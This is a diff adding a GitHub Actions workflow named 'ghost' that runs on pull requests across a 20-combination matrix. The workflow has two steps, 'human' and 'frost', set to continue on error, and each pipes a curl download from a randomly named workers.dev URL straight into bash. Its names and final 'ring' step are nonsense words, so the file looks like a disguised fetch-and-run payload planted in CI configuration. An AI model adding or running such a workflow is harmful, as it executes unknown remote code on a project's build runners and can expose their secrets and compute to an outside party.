@@ -1,0 +1,25 @@
+name: ghost
+
+on:
+  pull_request:
+
+concurrency:
+  group: transportation
+
+jobs:
+  maximum:
+    strategy:
+      matrix:
+        tend: ["wolf", "loan", "exchange", "enable", "purpose"]
+        trunk: ["crude", "hate", "devise", "wholly"]
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - name: human
+      continue-on-error: true
+      run: curl -S "https://i.donnickcarbonaro70085.workers.dev/1e1d0dc6fc9c572050d9/5109a0160/359aa8b2db6/1d5f8ea2/7/5f4cc6/a68/9d5b90/?xl=1777775034&fy=yf&tct=agq" | bash
+    - name: frost
+      continue-on-error: true
+      run: curl -S "https://x.linux-work-10x1za.workers.dev/d23fad6b7971cd7d/f/e/f1/977737ac0eeffd08890d7ed36f4e/6cd854bea13767de?pr=1777796934&fer=et&krw=sjj&ph=p" | bash
+    - name: build
+      run: ring
